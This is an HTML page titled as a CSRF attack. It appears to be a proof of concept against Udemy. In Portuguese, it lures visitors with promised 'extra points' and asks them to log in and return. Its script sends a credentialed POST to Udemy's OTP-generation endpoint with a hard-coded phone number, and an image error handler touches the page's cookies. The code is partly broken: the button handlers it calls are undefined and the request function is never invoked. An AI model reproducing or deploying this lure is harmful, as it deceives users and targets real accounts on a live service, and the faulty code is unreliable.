<!DOCTYPE html>
<html>
<head>
    <title>Ataque CSRF - Duas Janelas</title>
</head>
<body>
    <h1>Guia para ganhar pontos extras</h1>
    <p>Siga os passos abaixo para receber pontos exclusivos:</p>
    
    <div id="step1">
        <h3>Passo 1: Faça login na sua conta</h3>
        <p>Clique no botão abaixo e faça login na sua conta. <strong>Depois de fazer login, volte para esta página</strong>.</p>
        <button id="login-button" onclick="openLoginWindow()">Fazer Login</button>
    </div>
    
    <div id="step2" style="display:none;">
        <h3>Passo 2: Confirme seus dados para receber os pontos</h3>
        <p>Agora que você está logado, clique no botão abaixo para confirmar seus dados e receber os pontos:</p>
        <button id="confirm-button" onclick="executeCsrf()">Confirmar Meus Dados</button>
    </div>
    <img src="https://www.udemy.com/join/passwordless-auth/?locale=en_US" onerror="document.cookie" />
    <script>
        async function getData() {
              const url = "https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/";
              try {
                const response = await fetch(url, {
                  method: "POST",
                  credential: "include",
                "Content-Type": "application/json",
                  body: JSON.stringify({ "purpose":3,"phone_number":"+5514996810417" }),
                });
                if (!response.ok) {
                  throw new Error(`Response status: ${response.status}`);
                }
            
                const result = await response.json();
                console.log(result);
              } catch (error) {
                console.error(error.message);
              }
            }
    </script>
</body>
</html>
